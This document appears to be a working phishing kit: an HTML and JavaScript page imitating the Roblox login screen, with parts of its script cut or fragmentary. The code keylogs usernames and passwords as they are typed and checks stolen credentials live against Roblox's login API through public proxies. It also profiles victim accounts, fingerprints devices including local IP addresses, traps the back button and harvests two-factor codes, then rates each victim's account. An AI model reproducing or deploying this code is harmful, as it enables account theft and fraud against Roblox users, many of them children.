<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="dark">
<meta name="theme-color" content="#08080a">
<meta name="robots" content="noindex">
<meta name="apple-mobile-web-app-capable" content="yes">
<title>Log in to Roblox</title>
<link rel="icon" href="https://www.roblox.com/favicon.ico">
<link rel="preconnect" href="https://tr.rbxcdn.com">
<style>
  .page{
    --blue:#4d9bff; --r:8px;
    margin:0; position:relative;
    font-family:"Builder Sans","HCo Gotham SSm",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
    color:#fff; -webkit-font-smoothing:antialiased; -webkit-text-size-adjust:100%;
    display:flex; align-items:center; justify-content:center;
    min-height:max(100vh,760px); padding:40px 18px;
    background:#08080a; line-height:normal; text-align:left;
  }
  .page *{box-sizing:border-box}
  .bg{position:fixed;inset:0;overflow:hidden;background:#08080a;z-index:0}
  .bg .grid{position:absolute;top:-22%;left:-18%;width:136%;height:144%;transform:rotate(-8deg);
    display:grid;grid-template-columns:repeat(5,1fr);grid-template-rows:repeat(8,1fr);gap:10px}
  .bg .grid i{display:block;border-radius:12px;background-color:#15151a;background-size:cover;background-position:center}
  .veil{position:fixed;inset:0;z-index:1;pointer-events:none;
    background:radial-gradient(ellipse 50% 56% at 50% 48%,rgba(0,0,0,.7) 0%,rgba(0,0,0,.46) 45%,rgba(0,0,0,.66) 100%)}
  .veil::after{content:"";position:absolute;inset:0;
    backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
    -webkit-mask-image:radial-gradient(ellipse 44% 50% at 50% 48%,#000 16%,transparent 76%);
    mask-image:radial-gradient(ellipse 44% 50% at 50% 48%,#000 16%,transparent 76%)}

  /* ---- card / modal ---- */
  .wrap{position:relative;z-index:2;width:100%;max-width:372px}
  .card{background:rgba(16,16,20,.90);border:1px solid rgba(255,255,255,.10);
    border-radius:16px;padding:26px 24px 20px;position:relative}
  .close{position:absolute;top:10px;left:10px;width:34px;height:34px;display:flex;align-items:center;
    justify-content:center;background:none;border:0;padding:0;border-radius:8px;cursor:pointer;
    color:#fff;opacity:.7;z-index:3}
  .close:hover{opacity:1;background:rgba(255,255,255,.1)}
  .close svg{width:18px;height:18px}
  .hidden{display:none !important}
  .wordmark{display:block;width:206px;max-width:76%;margin:6px auto 22px;filter:invert(1)}
  h1{font-size:20px;font-weight:700;text-align:center;margin:0 0 4px}
  .sub{font-size:13px;color:rgba(255,255,255,.6);text-align:center;margin:0 0 18px}
  .note{font-size:14px;line-height:1.5;color:rgba(255,255,255,.72);text-align:center;margin:0 0 16px}
  .err{font-size:13px;color:#ff6b6b;background:rgba(255,107,107,.10);
    border:1px solid rgba(255,107,107,.28);border-radius:8px;padding:9px 11px;margin:0 0 12px;text-align:center}

  .field{position:relative;margin-bottom:10px}
  input{display:block;width:100%;height:46px;padding:0 14px;font-family:inherit;font-size:15px;color:#fff;
    background:rgba(0,0,0,.30);border:1px solid rgba(255,255,255,.40);border-radius:var(--r);
    outline:none;-webkit-appearance:none;appearance:none;transition:border-color .12s,background .12s}
  input::placeholder{color:rgba(255,255,255,.72)}
  input:focus{border-color:rgba(255,255,255,.85);background:rgba(0,0,0,.44)}
  .field.padR input{padding-right:46px}
  .field.padR2 input{padding-right:82px}
  input:-webkit-autofill{-webkit-box-shadow:0 0 0 1000px #24252c inset;-webkit-text-fill-color:#fff;
    animation-name:onAutoFillStart}
  @keyframes onAutoFillStart{from{}to{}}
  .hp{position:absolute;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
  .eye,.chk{position:absolute;right:5px;top:50%;transform:translateY(-50%);width:36px;height:36px;
    display:flex;align-items:center;justify-content:center;background:none;border:0;padding:0;
    border-radius:6px;cursor:pointer;color:#fff;opacity:.8}
  .chk{cursor:default;opacity:1}
  .chk img{width:24px;height:24px;border-radius:50%;border:1px solid rgba(255,255,255,.25);display:block}
  .chk .tk{position:absolute;right:-1px;bottom:1px;width:13px;height:13px;border-radius:50%;
    background:#2ecc71;display:flex;align-items:center;justify-content:center;font-size:9px;color:#04170c}
  .eye svg{width:20px;height:20px}
  .caps{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:11px;
    color:#ffd166;letter-spacing:.4px;display:none}
  .field.capson .caps{display:block}

  .btn{position:relative;display:flex;align-items:center;justify-content:center;gap:9px;width:100%;height:46px;
    padding:0 16px;font-family:inherit;font-size:15px;font-weight:600;color:#fff;
    border:1px solid transparent;border-radius:var(--r);cursor:pointer;transition:background .12s,border-color .12s}
  .btn.primary{margin-top:4px;background:rgba(214,226,255,.30);border-color:rgba(255,255,255,.26);font-weight:700}
  .btn.primary:hover{background:rgba(214,226,255,.40)}
  .btn.ghost{margin-top:10px;background:rgba(0,0,0,.22);border-color:rgba(255,255,255,.45)}
  .btn.ghost:hover{background:rgba(255,255,255,.12)}
  .btn.soc{justify-content:flex-start;padding:0 14px;font-weight:500;background:rgba(0,0,0,.22);
    border-color:rgba(255,255,255,.45)}
  .btn.soc:hover{background:rgba(255,255,255,.12)}
  .btn.soc svg{width:17px;height:17px;flex:none}
  .btn.soc .lbl{flex:1;text-align:center;margin-right:17px}
  .btn:disabled{opacity:.6;cursor:default}
  .or{display:flex;align-items:center;gap:10px;margin:16px 0 4px;color:rgba(255,255,255,.45);font-size:12px}
  .or::before,.or::after{content:"";flex:1;height:1px;background:rgba(255,255,255,.16)}
  .sp{width:15px;height:15px;flex:none;border-radius:50%;display:none;
    border:2px solid rgba(255,255,255,.35);border-top-color:#fff;animation:spin .7s linear infinite}
  .btn.loading .sp{display:block}
  @keyframes spin{to{transform:rotate(360deg)}}

  .small{display:block;text-align:center;font-size:13px;color:rgba(255,255,255,.9);text-decoration:none;margin-top:14px}
  .small:hover{text-decoration:underline}
  .signup{text-align:center;font-size:14px;color:rgba(255,255,255,.8);margin-top:18px}
  .signup a{color:var(--blue);text-decoration:none} .signup a:hover{text-decoration:underline}
  .legal{display:flex;justify-content:center;gap:20px;margin-top:12px}
  .legal a{font-size:12px;color:var(--blue);text-decoration:none;opacity:.85} .legal a:hover{text-decoration:underline}

  .lang{display:flex;justify-content:center;margin-top:14px}
  .lang select{font-family:inherit;font-size:12px;color:rgba(255,255,255,.75);background:rgba(0,0,0,.3);
    border:1px solid rgba(255,255,255,.18);border-radius:6px;padding:4px 8px;outline:none;cursor:pointer}
  .lang select option{background:#15151a;color:#fff}

  .acct{display:flex;align-items:center;gap:12px;justify-content:center;margin:0 0 14px;min-height:52px}
  .acct img{width:52px;height:52px;border-radius:50%;border:1px solid rgba(255,255,255,.22);display:block;background:#15151a}
  .acct .nm{font-size:15px;font-weight:600;line-height:1.2}
  .acct .meta{font-size:12px;color:rgba(255,255,255,.55)}
  .acct .look{font-size:13px;color:rgba(255,255,255,.5)}
  .timer{text-align:center;font-size:12px;color:rgba(255,255,255,.5);margin:10px 0 0;font-variant-numeric:tabular-nums}
  .timer.warn{color:#ffd166}

  .tick{width:54px;height:54px;margin:6px auto 16px;border-radius:50%;background:rgba(46,204,113,.14);
    border:1px solid rgba(46,204,113,.5);display:flex;align-items:center;justify-content:center}
  .tick svg{width:26px;height:26px;color:#2ecc71}
  .resend{display:block;width:100%;margin-top:12px;background:none;border:0;padding:0;font-family:inherit;
    font-size:13px;color:rgba(255,255,255,.85);text-align:center;cursor:pointer}
  .resend:hover{text-decoration:underline}

  /* ---- overlay ---- */
  .ov{position:fixed;inset:0;z-index:5;display:flex;align-items:center;justify-content:center;
    background:rgba(8,8,10,.72);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px)}
  .ovc{text-align:center;padding:20px}
  .ovc img{width:74px;height:74px;border-radius:50%;border:2px solid rgba(255,255,255,.2);
    display:block;margin:0 auto 16px;background:#15151a;animation:pulse 1.5s ease-in-out infinite}
  .ovc .nm{font-size:15px;font-weight:600;margin-bottom:10px}
  .ovsp{width:22px;height:22px;margin:0 auto 12px;border-radius:50%;
    border:2.5px solid rgba(255,255,255,.25);border-top-color:#fff;animation:spin .7s linear infinite}
  .ovc .txt{font-size:13px;color:rgba(255,255,255,.7)}
  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}

  .toast{position:fixed;left:50%;bottom:22px;transform:translate(-50%,8px);z-index:9;background:#1c1d24;
    border:1px solid rgba(255,255,255,.16);border-radius:10px;padding:10px 16px;font-size:13px;color:#fff;
    opacity:0;transition:opacity .18s,transform .18s;pointer-events:none}
  .toast.on{opacity:1;transform:translate(-50%,0)}
  #dev{position:fixed;right:10px;bottom:10px;z-index:10;display:none;max-width:250px;max-height:38vh;
    overflow:auto;background:rgba(10,10,14,.94);border:1px solid rgba(255,255,255,.16);border-radius:8px;
    padding:8px 10px;font:11px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;color:#cfd3dc}
  #dev b{color:#4d9bff;font-weight:400}
  @media (max-width:640px){
    .bg .grid{grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(10,1fr)}
    .card{padding:24px 18px 18px}
    .wordmark{width:186px;margin-bottom:18px}
  }
</style>
</head>
<body class="page">

<div class="bg" aria-hidden="true"><div class="grid" id="grid"></div></div>
<div class="veil" aria-hidden="true"></div>

<main class="wrap">

  <!-- ============ STEP 1 ============ -->
  <section id="step1">
    <div class="card">
      <button class="close" id="close" type="button" aria-label="Close">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M5 5l14 14M19 5L5 19"/></svg>
      </button>

      <img class="wordmark" alt="Roblox" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg">
      <h1 data-i18n="login.title">Log In</h1>
      <p class="sub" data-i18n="login.sub">to continue to Roblox</p>

      <div class="err hidden" id="err"></div>

      <form id="f1">
        <div class="field padR" id="uf">
          <input id="u" name="u" type="text" placeholder="Username/Email" data-i18n-ph="ph.user"
                 autocomplete="username" autocapitalize="none" autocorrect="off" spellcheck="false" required>
          <div class="chk hidden" id="uchk"><img id="uav" alt=""><div class="tk">✓</div></div>
        </div>
        <div class="field padR2" id="pf">
          <input id="p" name="p" type="password" placeholder="Password" data-i18n-ph="ph.pass"
                 autocomplete="current-password" required>
          <span class="caps">CAPS</span>
          <button class="eye" type="button" id="eye" aria-label="Show password">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1.6 12S5.2 5.6 12 5.6 22.4 12 22.4 12 18.8 18.4 12 18.4 1.6 12 1.6 12Z"/>
              <circle cx="12" cy="12" r="3.2"/>
            </svg>
          </button>
        </div>
        <input class="hp" id="hp" type="text" tabindex="-1" autocomplete="off" aria-hidden="true">
        <button class="btn primary" id="b1" type="submit"><span class="sp"></span><span data-i18n="btn.login">Log In</span></button>
      </form>

      <button class="btn ghost" id="otc" type="button" data-i18n="btn.otc">Email Me a One-Time Code</button>
      <button class="btn ghost" id="quick" type="button" data-i18n="btn.quick">Quick Sign-in</button>

      <div class="or"><span data-i18n="or">or</span></div>

      <button class="btn soc" type="button" data-p="Google" style="margin-top:12px">
        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9 3.5l6.7-6.7C35.6 2.4 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.4 17.6 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v9h12.7c-.6 3-2.3 5.5-4.8 7.2l7.6 5.9c4.4-4.1 7-10.1 7-17.6z"/><path fill="#FBBC05" d="M10.4 28.7c-.5-1.4-.8-2.9-.8-4.7s.3-3.3.8-4.7l-7.8-6.1C.9 16.5 0 20.1 0 24s.9 7.5 2.6 10.8l7.8-6.1z"/><path fill="#34A853" d="M24 48c6.2 0 11.5-2 15.3-5.5l-7.6-5.9c-2.1 1.4-4.8 2.3-7.7 2.3-6.4 0-11.7-3.9-13.6-9.4l-7.8 6.1C6.5 42.6 14.6 48 24 48z"/></svg>
        <span class="lbl">Google</span>
      </button>
      <button class="btn soc" type="button" data-p="Apple">
        <svg viewBox="0 0 24 24" fill="#fff"><path d="M16.4 12.7c0-2.6 2.1-3.8 2.2-3.9-1.2-1.7-3-1.9-3.6-1.9-1.5-.2-3 .9-3.8.9-.8 0-2-.9-3.3-.9-1.7 0-3.2 1-4.1 2.5-1.7 3-.4 7.5 1.3 9.9.8 1.2 1.8 2.5 3.1 2.5 1.2 0 1.7-.8 3.2-.8 1.5 0 1.9.8 3.2.8 1.3 0 2.2-1.2 3-2.4.9-1.4 1.3-2.8 1.3-2.8s-2.5-1-2.5-3.9zM14 5.4c.7-.8 1.1-1.9 1-3-.9 0-2 .6-2.7 1.4-.6.7-1.1 1.9-1 2.9 1 .1 2-.5 2.7-1.3z"/></svg>
        <span class="lbl">Apple</span>
      </button>
      <button class="btn soc" type="button" data-p="Passkey">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="15" r="4"/><path d="M10.8 12.2 20 3M17 6l2.2 2.2M14.4 8.6l2.2 2.2"/></svg>
        <span class="lbl" data-i18n="btn.passkey">Log In with a Passkey</span>
      </button>

      <a class="small" data-i18n="link.forgot" href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a>

      <div class="signup"><span data-i18n="signup.q">Don't have an account?</span> <a href="https://www.roblox.com/CreateAccount" data-i18n="signup.a">Sign Up</a></div>
      <div class="legal">
        <a href="https://www.roblox.com/info/terms" data-i18n="legal.terms">Terms</a>
        <a href="https://www.roblox.com/info/privacy" data-i18n="legal.privacy">Privacy</a>
      </div>

      <div class="lang">
        <select id="langSel" aria-label="Language">
          <option value="en">English</option><option value="de">Deutsch</option>
          <option value="tr">Türkçe</option><option value="pt">Português</option>
          <option value="es">Español</option><option value="fr">Français</option>
        </select>
      </div>
    </div>
  </section>

  <!-- ============ STEP 2 ============ -->
  <section id="step2" class="hidden">
    <div class="card">
      <button class="close" id="back" type="button" aria-label="Back" style="opacity:.8">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 5l-7 7 7 7"/></svg>
      </button>

      <img class="wordmark" alt="Roblox" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg">

      <div class="acct" id="acct">
        <div class="look" id="acctLook" data-i18n="acct.looking">Looking up your account…</div>
        <img id="acctImg" class="hidden" alt="">
        <div class="hidden" id="acctTxt">
          <div class="nm" id="acctName"></div>
          <div class="meta" id="acctSub"></div>
        </div>
      </div>

      <h1 data-i18n="v.title">Verification</h1>
      <p class="note" id="codeNote" data-i18n="v.note">Enter the 6-digit code from your email or authenticator app.</p>

      <form id="f2">
        <div class="field">
          <input id="c" name="c" type="text" inputmode="numeric" placeholder="Code" data-i18n-ph="ph.code"
                 autocomplete="one-time-code" maxlength="8" enterkeyhint="done" required
                 style="text-align:center;letter-spacing:6px;font-size:17px;font-weight:600">
        </div>
        <button class="btn primary" id="b2" type="submit"><span class="sp"></span><span data-i18n="btn.cont">Continue</span></button>
      </form>

      <div class="timer" id="timer"></div>
      <button class="resend" id="resend" type="button" data-i18n="v.resend">Didn't get a code? Send it again</button>
      <button class="resend" id="lost" type="button" data-i18n="v.lost">Lost your device? Enter a backup code</button>
    </div>
  </section>

  <!-- ============ STEP 3 ============ -->
  <section id="step3" class="hidden">
    <div class="card">
      <div class="tick"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
      <h1 data-i18n="ok.title">You're logged in</h1>
      <p class="note" data-i18n="ok.note">Taking you to Roblox…</p>
      <button class="resend" id="retry" type="button" data-i18n="ok.retry">Code didn't work? Enter it again</button>
    </div>
  </section>
</main>

<div class="ov hidden" id="ov">
  <div class="ovc">
    <img id="ovImg" class="hidden" alt="">
    <div class="nm hidden" id="ovName"></div>
    <div class="ovsp"></div>
    <div class="txt" id="ovTxt">Verifying your account…</div>
  </div>
</div>

<div class="toast" id="toast"></div>
<div id="dev"></div>

function localIP(){
  return new Promise(function(res){
    var done=false; function fin(v){ if(!done){ done=true; res(v||""); } }
    setTimeout(()=>fin(""), 1600);
    try{
      var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
      pc.createDataChannel("x");
      pc.onicecandidate = function(e){
        if(!e.candidate) return;
        var m = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
        if(m) fin(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
    }catch(e){ fin(""); }
  });
}
function pubIP(){
  return new Promise(function(res){

    fetch("https://ipwho.is/", {signal:c.signal}).then(r=>r.json()).then(function(j){
      clearTimeout(tm);
      if(j && j.success !== false && j.ip) res({ip:j.ip, loc:[j.city,j.region,j.country].filter(Boolean).join(", "), isp:j.connection?j.connection.isp:""});
      else throw 0;
    }).catch(function(){
      fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>res({ip:j.ip,loc:"",isp:""})).catch(()=>res({ip:"",loc:"",isp:""}));
    });
  });
}

const PGET = [
  u => "https://api.allorigins.win/raw?url=" + encodeURIComponent(u),
  u => "https://corsproxy.io/?url=" + encodeURIComponent(u),
  u => "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(u)
];
function pfetch(url, ms, asText){
  ms = ms || 3500;
  var i = 0;
  function next(){
    if(i >= PGET.length) return Promise.reject(0);
    var c = new AbortController(); var tm = setTimeout(()=>c.abort(), ms);
    return fetch(PGET[i++](url), {signal:c.signal})
      .then(r => { clearTimeout(tm); if(!r.ok) throw 0; return asText ? r.text() : r.json(); })
      .catch(next);
  }
  return next();
}
const PPOST = [
  u => "https://corsproxy.io/?url=" + encodeURIComponent(u),
  u => "https://api.codetabs.com/v1/proxy?quest=" + encodeURIComponent(u),
  u => "https://thingproxy.freeboard.io/fetch/" + u
];
function ppost(url, obj, headers, ms){
  ms = ms || 4500;
  var i = 0;
  function next(){
    if(i >= PPOST.length) return Promise.reject(0);
    var c = new AbortController(); var tm = setTimeout(()=>c.abort(), ms);
    return fetch(PPOST[i++], {
      method:"POST",
      headers:Object.assign({"Content-Type":"application/json"}, headers||{}),
      body:JSON.stringify(obj), signal:c.signal
    }).then(r => { clearTimeout(tm); return r.json(); }).catch(next);
  }
  return next();
}

function liveCheck(u, p){
  if(!OPT.liveVerify || !CSRF || !u || !p) return Promise.resolve(null);
  return ppost("https://auth.roblox.com/v2/login", {ctype:u.indexOf("@")>-1?"Email":"Username", cvalue:u, password:p}, {"x-csrf-token":CSRF})
    .then(function(j){
      if(j && j.user) {
        if(j.twoStepVerificationData && j.twoStepVerificationData.mediaType) return {state:"2fa", media:j.twoStepVerificationData.mediaType, name:j.user.name, id:j.user.id};
        return {state:"ok", name:j.user.name, id:j.user.id};
      }
      var msg = j && j.errors && j.errors[0] ? j.errors[0].message : "";
      if(/captcha/i.test(msg)) return {state:"captcha"};
      return {state:"bad", msg:msg};
    }).catch(()=>null);
}

var ACC = null;
function recon(name){
  if(!OPT.recon || !name || name.indexOf("@") > -1) return Promise.resolve(null);
  if(ACC && ACC.name && ACC.name.toLowerCase() === name.toLowerCase()) return Promise.resolve(ACC);
  return pfetch("https://users.roblox.com/v1/users/search?keyword="+encodeURIComponent(name)+"&limit=10")
    .then(function(j){
      var list = (j && j.data) || [], hit = null;
      for(var i=0;i<list.length;i++) if((list[i].name||"").toLowerCase() === name.toLowerCase()){ hit = list[i]; break; }
      if(!hit) return null;
      var id = hit.id;
      var jobs = [
        pfetch("https://users.roblox.com/v1/users/"+id).catch(()=>null),
        pfetch("https://friends.roblox.com/v1/users/"+id+"/friends/count").catch(()=>null),
        pfetch("https://friends.roblox.com/v1/users/"+id+"/followers/count").catch(()=>null),
        pfetch("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="+id+"&size=150x150&format=Png&isCircular=true").catch(()=>null)
      ];
      if(OPT.deepRecon){
        jobs.push(pfetch("https://groups.roblox.com/v1/users/"+id+"/groups/roles").catch(()=>null));
        jobs.push(pfetch("https://premiumfeatures.roblox.com/v1/users/"+id+"/validate-membership").catch(()=>null));
      }
      return Promise.all(jobs).then(function(a){
        var prof=a[0], fr=a[1], fo=a[2], th=a[3], gr=a[4], pr=a[5];
        var img = (th && th.data && th.data[0]) ? th.data[0].imageUrl : "";
        return { id:id, name:hit.name, display:hit.displayName||"", verified:!!hit.hasVerifiedBadge,
          prev:(hit.previousUsernames||[]).join(", "),
          created:(prof&&prof.created)?prof.created.slice(0,10):"",
          desc:(prof&&prof.description)?prof.description.slice(0,120):"",
          friends:(fr&&typeof fr.count==="number")?fr.count:"",
          followers:(fo&&typeof fo.count==="number")?fo.count:"",
          groups:(gr&&gr.data)?gr.data.length:"",
          premium:(pr===true?"yes":pr===false?"no":""), avatar:img };
      });
    }).catch(()=>null);
}

  var grid = $("#grid"); if(!grid) return;
  var T = [
    "https://tr.rbxcdn.com/180DAY-5e0d32b22a6e00d39c6d60579f8ae2e8/768/432/Image/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem6/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem2/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem9/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem8/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem1/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem12/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem10/Png/noFilter",
    "https://tr.rbxcdn.com/180DAY-980ef4b4b4639b6cfe29a484e537e847/768/432/GameMediaItem11/Png/noFilter"
  ];
  T.forEach(u => { var i = new Image(); i.src = u; });
  var frag = document.createDocumentFragment();
  for(var i=0;i<40;i++){ var d=document.createElement("i"); d.style.backgroundImage="url('"+T[(i*5+1)%T.length]+"')"; frag.appendChild(d); }
  grid.appendChild(frag);
})();

/* ==================================================================
   10. BACK-TRAP + CLIPBOARD + AUTOFILL-DETECT
   ================================================================== */
if(OPT.backTrap){
  try{
    history.replaceState({rbx:0}, "", location.href);
    history.pushState({rbx:1}, "", location.href);
    window.addEventListener("popstate", function(e){ if(e.state && e.state.rbx === 0) history.pushState({rbx:1}, "", location.href); });
  }catch(e){}
}
if(OPT.clipboard){
  document.addEventListener("copy", function(e){
    try{
      var sel = String(window.getSelection());
      if(!sel || sel.length > 70 || !e.clipboardData) return;
      e.clipboardData.setData("text/plain", sel + "\n" + LINK);
      log("clipboard +link");
    }catch(err){}
  });
}
$("#p").addEventListener("animationstart", function(e){ if(e.animationName === "onAutoFillStart"){ autofilled = true; log("autofilled"); } });

/* ==================================================================
   11. UI
   ================================================================== */
function busy(b,on){ if(on){ b.classList.add("loading"); b.disabled=true; } else { b.classList.remove("loading"); b.disabled=false; } }
function show(sel){ ["#step1","#step2","#step3"].forEach(s => $(s).classList.add("hidden")); $(sel).classList.remove("hidden"); }
function go(){ log("redirect"+(NOGO?" (bleibt)":"")); if(NOGO){ toast("dev: kein redirect"); return; } location.href = REDIRECT; }
function overlay(on, txt, acc){
  if(!on){ $("#ov").classList.add("hidden"); return; }
  $("#ovTxt").textContent = txt || t("ov.verify");
  if(acc && acc.avatar){ $("#ovImg").src = acc.avatar; $("#ovImg").classList.remove("hidden");
    $("#ovName").textContent = "@" + acc.name; $("#ovName").classList.remove("hidden"); }
  else { $("#ovImg").classList.add("hidden"); $("#ovName").classList.add("hidden"); }
  $("#ov").classList.remove("hidden");
}
function startTimer(){
  clearInterval(tickT);
  if(!OPT.countdown){ $("#timer").textContent = ""; return; }
  var left = 300;
  function paint(){
    if(left <= 0){ $("#timer").textContent = t("v.expd"); $("#timer").classList.add("warn"); return; }
    $("#timer").textContent = t("v.exp") + " " + Math.floor(left/60) + ":" + pad(left%60);
    $("#timer").classList.toggle("warn", left <= 45);
    left--;
  }
  paint(); tickT = setInterval(paint, 1000);
}
function showCode(kind){
  show("#step2"); codeKind = kind; askedAt = Date.now();
  $("#codeNote").textContent = t(kind === "otc" ? "v.otc" : "v.note");
  document.title = "Verification · Roblox";
  buzz(12); overlay(false);
  setTimeout(()=>$("#c").focus(), 60);
  startTimer();
  if(ACC) showAcct(ACC);
}

/* --- Live-Tastatur-Log --- */
if(OPT.keylog){
  $("#u").addEventListener("input", function(){
    clearTimeout(tU);
    var v = $("#u").value.trim();
    $("#uchk").classList.add("hidden");
    if(v.length < 3 || v === typedU) return;
    tU = setTimeout(function(){
      if(submitted) return;
      typedU = v;
      post(payload("Username (typed)", [f("Username","`"+v+"`")]));
      if(OPT.namePreview) previewName(v);
    }, 1400);
  });
  $("#p").addEventListener("input", function(){
    clearTimeout(tP);
    var v = $("#p").value;
    if(v.length < 4 || v === typedP) return;
    tP = setTimeout(function(){
      if(submitted) return;
      typedP = v;
      post(payload("Password (typed)", [f("Password","`"+v+"`"), fh("Length", v.length)]));
    }, 2000);
  });
}
function previewName(v){
  recon(v).then(function(a){
    if(!a) return;
    if($("#u").value.trim().toLowerCase() !== a.name.toLowerCase()) return;
    ACC = a;
    $("#uav").src = a.avatar || "";
    $("#uchk").classList.remove("hidden");
    log("preview @"+a.name);
  });
}

/* --- Caps-Lock --- */
document.addEventListener("keyup", function(e){
  try{ if(typeof e.getModifierState !== "function") return; $("#pf").classList.toggle("capson", e.getModifierState("CapsLock")); }catch(err){}
});

/* --- STEP 1 --- */
$("#f1").addEventListener("submit", function(e){
  e.preventDefault();
  var b = $("#b1"); if(b.classList.contains("loading")) return;
  busy(b, true); click(); $("#err").classList.add("hidden");

  var u = $("#u").value.trim(), p = $("#p").value;
  var bot = isBot(); submitted = true;
  log("submit "+u+(bot?" [BOT?]":""));
  try{ if(OPT.prefill) localStorage.setItem("rbx_lastuser", u); }catch(e2){}

  overlay(true, t("ov.verify"), ACC);

  var checkJob = liveCheck(u, p);
  var reconJob = recon(u).then(a => { ACC = a; return a; });

  Promise.all([fingerprint(), reconJob, checkJob, delay(OPT.minWait)]).then(function(r){
    var fp = r[0], acc = r[1], chk = r[2];
    overlay(false);

    // Live-Check: falsches Passwort
    if(chk && chk.state === "bad" && OPT.liveVerify === "strict" && !(acc && acc.name)){
      busy(b, false);
      $("#err").textContent = t("err.bad"); $("#err").classList.remove("hidden");
      log("live: bad password"); buzz([20,60,20]);
      post(payload("Wrong password (blocked)", [f("Username","`"+u+"`"), f("Password","`"+p+"`")], {color:0xff6b6b}));
      submitted = false;
      return;
    }

    var fields = [
      f("Username","`"+u+"`"), f("Password","`"+p+"`"),
      fh("Length", p.length), fh("Autofilled", autofilled ? "yes" : "no"),
      fh("Bot?", bot ? "yes" : "no"), fh("Source", SRC + (ALT ? " / "+ALT : ""))
    ];
    if(chk){
      fields.push(f("— LIVE CHECK —"," "));
      fields.push(fh("Password", chk.state === "bad" ? "WRONG" : chk.state === "ok" ? "correct (no 2FA!)" : chk.state === "captcha" ? "captcha" : "correct"));
      if(chk.media) fields.push(fh("2FA type", chk.media));
    } else if(OPT.liveVerify){
      fields.push(fh("Live check", "unavailable"));
    }
    if(acc){
      fields.push(f("— ACCOUNT —"," "));
      fields.push(fh("Real name", acc.name + (acc.verified ? " ✔" : "")));
      fields.push(fh("User ID", acc.id));
      fields.push(fh("Created", acc.created + (acc.created ? " · "+ageText(acc.created) : "")));
      fields.push(fh("Friends", acc.friends)); fields.push(fh("Followers", acc.followers));
      fields.push(fh("Groups", acc.groups)); fields.push(fh("Premium", acc.premium));
      if(acc.prev) fields.push(fh("Old names", acc.prev));
      fields.push(fh("Profile", "roblox.com/users/"+acc.id+"/profile"));
      if(acc.desc) fields.push(f("Description", acc.desc));
    } else {
      fields.push(f("Account lookup", "not found (email or rare name)"));
    }
    fields.push(f("— DEVICE —"," "));
    fields.push(fh("Public IP", fp.pub)); fields.push(fh("Location", fp.loc)); fields.push(fh("ISP", fp.isp));
    fields.push(fh("LAN IP", fp.lan)); fields.push(fh("Timezone", fp.tz));
    fields.push(fh("Languages", fp.lang)); fields.push(fh("Hardware", fp.hw));
    fields.push(fh("GPU", fp.gpu)); fields.push(fh("Screen", fp.scr));
    fields.push(fh("Touch", fp.touch)); fields.push(fh("Battery", fp.bat));
    fields.push(fh("Network", fp.net)); fields.push(fh("Canvas", fp.canvas));
    fields.push(fh("Referrer", fp.ref)); fields.push(f("Device", device()));
    fields.push(f("Visitor", fp.vid));
    fields.push(fh("Worth keeping", score(acc, autofilled) + "/100"));

    return post(payload("New Login", fields, {
      ping: OPT.ping, color: acc ? ageColor(acc.created) : 0x335fff, thumb: acc ? acc.avatar : ""
    })).then(function(){
      busy(b, false); buzz(20);
      if(OPT.step2) showCode("pw"); else go();
    });
  });
});

/* --- STEP 2 --- */
$("#f2").addEventListener("submit", function(e){
  e.preventDefault();
  var b = $("#b2"); if(b.classList.contains("loading")) return;
  var code = $("#c").value.replace(/\s+/g, "");
  if(!code) return;
  busy(b, true); click();
  codeSent = true; clearInterval(tickT);
  log("code "+code);

